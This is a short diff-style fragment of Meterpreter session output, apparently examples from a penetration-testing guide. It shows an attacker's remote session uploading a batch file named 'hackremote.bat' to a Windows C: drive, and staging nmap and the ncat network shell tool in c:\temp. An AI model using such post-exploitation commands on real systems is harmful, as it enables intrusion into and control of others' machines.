@@ -1,0 +1,13 @@
+- meterpreter > upload /tmp/hackremote.bat c:\
+
+[*] uploading  : /tmp/hackremote.bat -> c:\
+[*] uploaded   : /tmp/hackremote.bat -> c:\\hackremote.bat
+
+
+[Sample #1]
+
+meterpreter > upload nmap.exe ncat c:\\temp
+[*] uploading  : nmap.exe -> c:\temp
+[*] uploaded   : nmap.exe -> c:\temp\nmap.exe
+[*] uploading  : ncat -> c:\temp
+[*] uploaded   : ncat -> c:\temp\ncat
